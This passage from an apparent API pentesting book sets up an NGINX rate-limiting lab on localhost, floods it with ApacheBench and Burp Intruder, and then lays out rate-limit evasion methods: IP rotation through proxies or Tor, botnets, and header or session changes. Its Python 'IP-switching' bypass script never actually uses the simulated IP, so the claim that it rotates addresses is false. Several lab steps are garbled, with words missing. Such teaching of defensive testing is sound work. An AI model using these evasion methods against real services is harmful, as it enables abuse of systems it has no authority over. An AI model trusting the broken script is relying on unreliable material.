			<p>To implement this lab, we will leverage<a id="_idIndexMarker579"/> NGINX. We could have done this in the form of a Docker container, but since Mockoon is directly running on top of our VM, we will take the secondary path: install NGINX on our Linux box. Just follow your operating system’s documentation on how to install the software. On Ubuntu, it’s a matter of a couple of <code>apt</code> commands. As soon as you finish it, NGINX will be listening on port <code>80</code>:</p>
			<div><div><img src="img/B19657_figure_07.13.jpg" alt="Figure 7.13 – NGINX default page"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.13 – NGINX default page</p>
			<p>Now, we need a proper <code>nginx.conf</code> file to tell NGINX<a id="_idIndexMarker580"/> to work as a reverse proxy, forwarding all requests to Mockoon and rate-limiting them. Replace the contents of the default <code>/etc/nginx/nginx.conf</code> file with the following contents:</p>
			<pre class="source-code">
events {
    worker_connections  1024;
}
http {
    limit_req_zone $binary_remote_addr zone=limitlab:10m rate=1r/s;
    include      mime.types;
    default_type application/json;
    server {
     listen      80;
     server_name localhost;
       location / {
            limit_req zone=limitlab burst=5;
            proxy_pass http://localhost:3000;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection 'upgrade';
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            proxy_cache_bypass $http_upgrade;
        }
    }
}</pre>			<p>Each option or directive<a id="_idIndexMarker581"/> has its own purpose:</p>
			<ul>
				<li><code>worker_connections</code>: This directive tells NGINX how many concurrent connections each worker process can handle, which is vital for handling multiple requests simultaneously.</li>
				<li><code>limit_req_zone $binary_remote_addr zone=limitlab:10m rate=1r/s</code>: This directive is used to define a rate-limiting property that limits the rate of requests that a client can make to a server. The <code>$binary_remote_addr</code> portion represents the client’s IP address in compact binary format. This applies the same rule for every single IP address that hits NGINX. We are allocating 10 MB of RAM for the <code>limitlab</code> shared memory zone we created and specifying a rate of one request per second. Further options are configured on the <code>limit_req</code> portion.</li>
				<li><code>include mime.types</code> and <code>default_type application/json</code> ensure that NGINX handles MIME types appropriately.</li>
				<li><code>limit_req zone=limitlab burst=5</code>: On the previously created <code>limitlab</code> zone, establish that a burst of up to five requests is processed without limiting, helping to accommodate scenarios where a client might occasionally make several requests in quick succession.</li>
				<li><code>proxy_pass http://localhost:3000</code> and <code>proxy_http_version 1.1</code>: Define the HTTP version to use and the backend’s address. In our case, the Mockoon API server.</li>
				<li><code>proxy_set_header Upgrade $http_upgrade</code>: This header is crucial for supporting WebSocket <a id="_idIndexMarker582"/>connections. The <code>Upgrade</code> header in HTTP requests is used to ask the server to switch protocols (e.g., from <code>HTTP/1.1</code> to <code>WebSocket</code>). It’s here for educational purposes only. Not applicable to our case.</li>
				<li><code>proxy_set_header Connection 'upgrade'</code>: This header is used to control whether the network connection stays open after the current transaction finishes. Setting this to <code>'upgrade'</code> complements the <code>Upgrade</code> header and is used primarily for WebSocket or other protocol upgrades. Educational only.</li>
				<li><code>proxy_set_header Host $host</code>: This header sets the <code>Host</code> header of the forwarded request to the value of the host of the incoming request to the NGINX server.</li>
				<li><code>proxy_set_header X-Real-IP $remote_addr</code>: This custom header is commonly used to pass the original client’s IP address to the backend server.</li>
				<li><code>proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for</code>: This header is used to append the client’s IP address to any existing <code>X-Forwarded-For</code> header received by NGINX. If there is no such header, NGINX will create it.</li>
				<li><code>proxy_set_header X-Forwarded-Proto $scheme</code>: This header is used to inform the backend server about the protocol the client used to connect to the proxy. <code>$scheme</code> will contain <code>http</code> or <code>https</code>, depending on the protocol.</li>
				<li><code>proxy_cache_bypass $http_upgrade</code>: This directive is used to bypass the cache if the <code>Upgrade</code> header is present in the client’s request. This is typically used in scenarios where caching responses may not be desirable, such as when initiating WebSocket connections. This is for educational purposes only too.</li>
			</ul>
			<p>I put a link in the <em class="italic">Further reading</em> section with more information <a id="_idIndexMarker583"/>about how to configure NGINX to work as a remote proxy. Restart the service if it is already running. By default, all accesses are logged to <code>/var/log/nginx/access.log</code>, and all errors are recorded on <code>/var/log/nginx/error.log</code>. Launch Wireshark too so you can inspect whether something different goes on. We’ll start with our friend, <code>ab</code>. We’ll suppress the <code>:3000</code> portion since we are now sending requests to NGINX, not directly to Mockoon. Parts of the output were omitted for brevity:</p>
			<pre class="console">
$ ab -n 100 -c 10 http://localhost/users
Server Software:        nginx/1.18.0
Concurrency Level:      10
Time taken for tests:   5.007 seconds
Complete requests:      100
Failed requests:        94
   (Connect: 0, Receive: 0, Length: 94, Exceptions: 0)
Non-2xx responses:      94
Requests per second:    19.97 [#/sec] (mean)
Time per request:       500.680 [ms] (mean)
Transfer rate:          11.61 [Kbytes/sec] received
Percentage of the requests served within a certain time (ms)
  50%      1
  66%      1
  75%      1
  80%      1
  90%      2
  95%    905
  98%   3902
  99%   4900
 100%   4900 (longest request)</pre>			<p>Very interesting! Compare<a id="_idIndexMarker584"/> this with the previous results we obtained when sending packets directly to Mockoon. Observe that 94 out of 100 packets failed to be received! This means that 94% of the traffic was filtered by NGINX. Considering that we allowed a burst of five requests per second, this signifies that <code>ab</code> successfully received one of its bursts and one packet that was sent all alone. When you go to Wireshark to inspect the traffic, we will find some packets being sent with a 503 error code:</p>
			<div><div><img src="img/B19657_figure_07.14.jpg" alt="Figure 7.14 – NGINX filtering the excessive requests that would go to Mockoon"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.14 – NGINX filtering the excessive requests that would go to Mockoon</p>
			<p>This happened with our basic test of 100 connections, with 10 of them simultaneously. In parallel, I was also monitoring the amount of allocated RAM and CPU occupation. There was no harm to any of them. Let’s repeat the most aggressive test that we ran with <code>ab</code> to see whether something changes:</p>
			<pre class="console">
$ ab -n 10000 -c 1000 http://localhost/users
Concurrency Level:      1000
Time taken for tests:   5.009 seconds
Complete requests:      10000
Failed requests:        9994
Percentage of the requests served within a certain time (ms)
  50%     50
  66%     56
  75%     69
  80%     77
  90%    118
  95%    129
  98%    135
  99%    145
 100%   4991 (longest request)</pre>			<p>There is the same number <a id="_idIndexMarker585"/>of blocked connections. Also, we notice a huge increase in the processing time for most of the requests (from 1 ms to around 60 ms on average). An analog output can be verified on Wireshark as well. Check <code>/var/log/nginx/error.log</code> and you’ll find some lines like this one:</p>
			<pre class="source-code">
[error] 11023#11023: *10619 limiting requests, excess: 5.048 by zone "limitlab", client: 127.0.0.1, server: localhost, request: "GET /users HTTP/1.1", host: "localhost"</pre>			<p>Well, we can attest that our rate-limiting mechanism is doing its job. Let’s see how we can discover this when such a thing is in place. For this, we apply Burp Suite. Before starting it, double-check that you don’t have any other service running on its proxy service port (by default, <code>8080</code>). With Burp on, switch to the <strong class="bold">Proxy</strong> tab and then to the <strong class="bold">Proxy Settings</strong> sub-tab to confirm it’s on. Then, go to the <strong class="bold">Intruder</strong> tab and click on the <strong class="bold">Intercept is on</strong> button to turn it off. We don’t want to have to click on <strong class="bold">Intercept</strong> for every single request we will send.</p>
			<p>Now, on the <code>http://localhost/users</code> on this internal browser. You will receive the expected JSON structure with random usernames and IDs. You are good to close this browser. Now, back to Burp’s main screen, go to the <strong class="bold">Proxy</strong> tab, and click on the <strong class="bold">HTTP history</strong> sub-tab. You will see the request there:</p>
			<div><div><img src="img/B19657_figure_07.15.jpg" alt="Figure 7.15 – Burp capturing the request sent to Mockoon and its response"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.15 – Burp capturing the request sent to Mockoon and its response</p>
			<p>Right-click on this request<a id="_idIndexMarker586"/> and select <strong class="bold">Send to Intruder</strong>. You’ll see that the <strong class="bold">Intruder</strong> tab will become orange. Click there. The first screen that shows up is named <strong class="bold">Positions</strong>. We won’t use it since we don’t need to change anything on the request. We are not fuzzing anything this time. We just need Burp to repeat it:</p>
			<div><div><img src="img/B19657_figure_07.16.jpg" alt="Figure 7.16 – The original request captured by Burp’s Intruder"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.16 – The original request captured by Burp’s Intruder</p>
			<p>You are good to use any attack<a id="_idIndexMarker587"/> type, although, for this test, either the Sniper or Battering ram attack would suffice. With multiple payloads, the Pitchfork or Cluster Bomb methods would be more appropriate.</p>
			<p>Next, switch to the <code>30</code> in the <strong class="bold">Generate payloads</strong> textbox. In the following figure, you can see the parameters changed in the <strong class="bold">Payloads</strong> section.</p>
			<div><div><img src="img/B19657_figure_07.17.jpg" alt="Figure 7.17 – Configuring Intruder to send 30 equal packets"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.17 – Configuring Intruder to send 30 equal packets</p>
			<p>Now, navigate to the <code>10</code>:</p>
			<div><div><img src="img/B19657_figure_07.18.jpg" alt="Figure 7.18 – Creating a resource pool and defining the number of concurrent requests"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.18 – Creating a resource pool and defining the number of concurrent requests</p>
			<p>Finally, click on the <strong class="bold">Start attack</strong> button. This will open the attack window (<em class="italic">Figure 7</em><em class="italic">.19</em>). This will make Intruder send repeated requests to NGINX. You will be watching them pop up on this window until request number 30. Some requests might arrive earlier than others, outside of the original order. That’s expected since NGINX is imposing limitations on them. As a side note, the delay while receiving packets is one variable we need to consider. This may mean a rate-limiting control is in place. You can see one of the successful requests in <em class="italic">Figure 7</em><em class="italic">.19</em>. Pay attention to the date.</p>
			<div><div><img src="img/B19657_figure_07.19.jpg" alt="Figure 7.19 – A successful request captured by Intruder"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.19 – A successful request captured by Intruder</p>
			<p>Let’s compare<a id="_idIndexMarker589"/> it with the request right after it (<em class="italic">Figure 7</em><em class="italic">.20</em>), which failed (a 503 response code). You can see that the failed request was sent four seconds before the successful one, showing that a possible rate-limiting mechanism is activated:</p>
			<div><div><img src="img/B19657_figure_07.20.jpg" alt="Figure 7.20 – A failed request that was received before the successful one"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.20 – A failed request that was received before the successful one</p>
			<p>Other indications that such <a id="_idIndexMarker590"/>types of controls are protecting the API are the presence of response codes such as 429, which means “too many requests” or the presence of the <code>Retry-After</code> header on the responses. Now that we have identified the possibility of being throttled while sending requests to API endpoints, we need to learn how we can bypass such protection mechanisms. That’s exactly what we will cover in the next section.</p>
			<h1 id="_idParaDest-125"><a id="_idTextAnchor127"/>Circumventing rate limitations</h1>
			<p>When NGINX acts as a vigilant<a id="_idIndexMarker591"/> guard, rate limiting becomes the key security measure controlling traffic flow and preventing malicious activities. NGINX has a set of rate-limiting configurations to restrict the number of requests an API client can send within a specific amount of time. To navigate these restrictions effectively, we must first become familiar with the specific rate-limiting mechanisms employed. This involves deciphering server responses, looking for clues such as <code>Retry-After</code> headers or specific error codes (e.g., 429 Too Many Requests) that signal the presence and details of rate limiting as we covered before.</p>
			<p>The first step to bypassing rate limitations is uncovering what triggers them. Common culprits include the client’s IP address, user session, or API key. By strategically varying these factors, we can pinpoint how the rate limit is applied. Tools such as Burp Suite become our allies, allowing us to manipulate request headers and simulate requests originating from different IPs or user sessions. Analyzing how the server’s response changes with different inputs can offer valuable hints about the underlying rate-limiting logic. In our case, we know NGINX is imposing a rate based on the source IP addresses.</p>
			<p>To bypass such a restriction, we commonly apply a rotation of the source IP address. By constantly changing the IP address used to send requests, we can evade restrictions tied to a specific IP. Tools such as VPNs, public proxy servers, or anonymizing networks such as Tor can be employed for this purpose. Furthermore, automated scripts or specialized tools can be used to dynamically route requests through a pool of different IP addresses, further complicating detection. That’s exactly what we’re going to do here.</p>
			<p>If the rate limit hinges on session identifiers or specific user-agent strings, altering these elements can potentially reset the rate limit counters. Burp Suite empowers us to manipulate cookies (which might store session data) and the <code>User-Agent</code> header within requests. Scripting custom headers for each request or leveraging browser automation tools that randomize user-agent strings can effectively bypass restrictions associated with user sessions or device types.</p>
			<p>Another way to successfully perpetrate<a id="_idIndexMarker592"/> rate-limiting bypassing is by splitting the requests among multiple servers or devices. If NGINX tracks the number of requests per IP address, utilizing multiple servers, each with a unique IP, to send requests can help distribute the load and lessen the risk of hitting rate limits. While this strategy involves complex coordination, it can be highly effective, especially when combined with IP rotation techniques. In real-world attacks, <strong class="bold">botnets</strong> are usually applied<a id="_idIndexMarker593"/> for this purpose. It’s a matter of sending a command to them and then the attack starts at the same time from multiple different geographic locations. If you don’t know much about botnets, I shared a reference in the <em class="italic">Further reading</em> section. Look when you can. It’s unmissable.</p>
			<p>Carefully examining how NGINX responds to requests exceeding rate limits can provide valuable insights into potential circumvention strategies. For instance, if the response headers suggest NGINX utilizes a fixed window counter for rate limiting, strategically sending requests just after the window resets can maximize request capacity.  Automated tools can be used to monitor the timing and patterns of rate limits, adjusting request timing accordingly to exploit this window.</p>
			<p>Time for action! Consider the following code. By switching the source IP address, we are sending different delayed<a id="_idIndexMarker594"/> requests to the <code>/</code><code>users</code> route:</p>
			<pre class="source-code">
import time
import requests
url = "http://localhost/users"
requests_per_ip = 10
delay_per_ip = 1
num_users = 5
for user_id in range(num_users):
    simulated_ip = f"10.0.0.{user_id+1}"
    print(f"Simulating user with IP: {simulated_ip}")
    # Loop to send requests for the current simulated user
    for i in range(requests_per_ip):
        response = requests.get(url)
        if response.status_code == 200:
            print(f"\tRequest {i+1} successful for user {user_id+1}.")
        else:
            print(f"\tRequest {i+1} failed for user {user_id+1}!")
            print(f"Status code: {response.status_code}")
            if response.status_code == 429 or response.status_code == 503:
                print(f"\tRate limit reached for user {user_id+1}!")
                print("\tWaiting for delay...")
                time.sleep(60)
        time.sleep(delay_per_ip)
print("All requests completed for simulated users.")</pre>			<p>This code simulates five different users. There’s a 1-second delay<a id="_idIndexMarker595"/> between each request and, when it fails, we add a 60-second (a.k.a. 1 minute) delay. We can adjust both timers, so they stay at the edge of the NGINX’s control. You can see that we are dispatching a total of 50 (10 times 5) requests in total, which would hit NGINX’s protection 9 times (remember that it allows a maximum burst of 5 requests). The key point here is the delay we are putting between every request. After running this code, you will receive successful outputs for all the requests (part of the output omitted for brevity):</p>
			<pre class="console">
     Request 8 successful for user 4.
     Request 9 successful for user 4.
     Request 10 successful for user 4.
Simulating user with IP: 10.0.0.5
     Request 1 successful for user 5.
     Request 2 successful for user 5.
     Request 3 successful for user 5.
     Request 4 successful for user 5.
     Request 5 successful for user 5.
     Request 6 successful for user 5.
     Request 7 successful for user 5.
     Request 8 successful for user 5.
     Request 9 successful for user 5.
     Request 10 successful for user 5.
All requests completed for simulated users.</pre>			<p>NGINX’s error log has no new lines since all requests were sent and received. We can confirm that by checking Mockoon’s logs as well. Hence, we can conclude that by sourcing the requests from different IP addresses with small delays between them and bypassing the rate-limiting imposed by NGINX. As a future exercise for your environment, tweak the timers and the <code>nginx.conf</code> file to see the behavior with different values. Don’t forget to restart the service to apply the changes.</p>
			<p>If an API provides multiple endpoints that can achieve similar results, alternating between them can help avoid exceeding rate limits on any single endpoint. This strategy depends on the API’s design, but it can be effective if rate limits are configured on a per-endpoint basis.</p>
			<p>Sometimes, simply modifying how requests are made can be enough to evade rate limiting. This could involve batching several operations into a single request or spreading out requests that typically occur in rapid succession over a longer duration.  APIs that offer endpoints capable of fetching or updating numerous resources in a single request can be particularly<a id="_idIndexMarker596"/> beneficial in such scenarios.</p>
			<h1 id="_idParaDest-126"><a id="_idTextAnchor128"/>Summary</h1>
			<p>In this more practical chapter, we had good coverage on DoS and DDoS, which can be used to discover vulnerabilities on target API endpoints. We then moved forward and learned how we detect when rate-limiting controls are in place (they can filter DoS attacks). We finished the chapter by crafting some Python code that, by imposing delays between requests and changing the source IP addresses, successfully bypassed the rate-limiting mechanism that was previously blocking them.</p>
			<p>In the next chapter, we will start a new part where we will discover advanced topics on pentesting APIs. We begin by understanding how successful invasions can cause data exposure and sensitive information leakage.</p>
			<h1 id="_idParaDest-127"><a id="_idTextAnchor129"/>Further reading</h1>
			<ul>
				<li>The attack against Google services: <a href="https://cloud.google.com/blog/products/identity-security/identifying-and-protecting-against-the-largest-ddos-attacks">https://cloud.google.com/blog/products/identity-security/identifying-and-protecting-against-the-largest-ddos-attacks</a></li>
				<li>AWS suffering a giant DDoS attack: <a href="https://aws-shield-tlr.s3.amazonaws.com/2020-Q1_AWS_Shield_TLR.pdf">https://aws-shield-tlr.s3.amazonaws.com/2020-Q1_AWS_Shield_TLR.pdf</a></li>
				<li>The Memcached vulnerability that affected GitHub with DDoS: <a href="https://github.blog/2018-03-01-ddos-incident-report/">https://github.blog/2018-03-01-ddos-incident-report/</a></li>
				<li>Create Mock APIs with Mockoon: <a href="https://mockoon.com/">https://mockoon.com/</a></li>
				<li>ApacheBench, a website/API performance tool:  <a href="https://httpd.apache.org/docs/current/programs/ab.html">https://httpd.apache.org/docs/current/programs/ab.html</a></li>
				<li>The Scapy Python library: <a href="https://pypi.org/project/scapy/">https://pypi.org/project/scapy/</a></li>
				<li><code>hping3</code>: <a href="https://linux.die.net/man/8/hping3">https://linux.die.net/man/8/hping3</a></li>
				<li><em class="italic">What is API </em><em class="italic">Throttling?</em>: <a href="https://www.tibco.com/glossary/what-is-api-throttling">https://www.tibco.com/glossary/what-is-api-throttling</a></li>
				<li>NGINX as a reverse proxy: <a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/</a></li>
				<li>Envoy, another open-source proxy offering: <a href="https://www.envoyproxy.io/">https://www.envoyproxy.io/</a></li>
				<li><em class="italic">Study of Botnets and their Threats to Internet </em><em class="italic">Security</em>: <a href="https://www.researchgate.net/publication/227859109_Study_of_Botnets_and_their_threats_to_Internet_Security">https://www.researchgate.net/publication/227859109_Study_of_Botnets_and_their_threats_to_Internet_Security</a></li>
				<li>More information on DoS and DDoS attacks: <a href="https://subscription.packtpub.com/book/programming/9781838645649/8/ch08lvl1sec02/denial-of-service-dos-and-distributed-denial-of-service-ddos-attacks">https://subscription.packtpub.com/book/programming/9781838645649/8/ch08lvl1sec02/denial-of-service-dos-and-distributed-denial-of-service-ddos-attacks</a></li>
				<li>Building RESTful Python web services, which various good tips on creating APIs, including imposing throttling to requests: <a href="https://www.packtpub.com/en-th/product/building-restful-python-web-services-9781786462251">https://www.packtpub.com/en-th/product/building-restful-python-web-services-9781786462251</a></li>
			</ul>
		</div>
	

		<div><h1 id="_idParaDest-128" lang="en-US" xml:lang="en-US"><a id="_idTextAnchor130"/>Part 4: API Advanced Topics</h1>
			<p>You can achieve good attack rates with the topics covered in <em class="italic">Part 3</em>. They are foundational but still very effective. However, there are some situations in which you have to make use of something more sophisticated. We are talking about advanced attack techniques, which are covered in this part. You will be presented with ways in which to detect data exposure and leakage. You will also learn what API business logic is and how you can leverage bad implementations of it to gain unauthorized access and do unauthorized actions. As was the case with <em class="italic">Part 3</em>, you will be presented with some recommendations on how to avoid problems with this critical part of any API.</p>
			<p>This section contains the following chapters:</p>
			<ul>
				<li><a href="B19657_08.xhtml#_idTextAnchor131"><em class="italic">Chapter 8</em></a>, <em class="italic">Data Exposure and Sensitive Information Leakage</em></li>
				<li><a href="B19657_09.xhtml#_idTextAnchor141"><em class="italic">Chapter 9</em></a>, <em class="italic">API Abuse and Business Logic Testing</em></li>
			</ul>
		</div>
		<div><div></div>
		</div>
		<div><div></div>
		</div>
	</body></html>